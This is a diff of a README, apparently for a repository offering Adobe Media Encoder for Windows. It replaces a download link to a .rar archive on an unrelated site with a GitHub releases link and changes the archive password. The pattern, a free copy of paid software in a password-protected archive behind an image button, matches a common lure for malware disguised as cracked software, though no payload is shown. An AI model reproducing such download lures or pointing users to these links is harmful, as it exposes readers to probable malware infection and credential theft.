@@ -15,10 +15,10 @@
 > [!NOTE]
 > - **Select a version**
 
-[![Windows](https://ltdfoto.ru/images/2024/07/31/Group_4_2.png)](https://lesfrancs-tireurs.net/temp/Software.rar)
+[![Windows](https://ltdfoto.ru/images/2024/07/31/Group_4_2.png)](https://github.com/RAm-SaGar-863/Adobe-Media-Encoder/releases/tag/Encoder)
 
 > [!NOTE]
-> **PASSWORD: DOWNLOAD2121**
+> **PASSWORD: ENCODER2024**
 
 
 
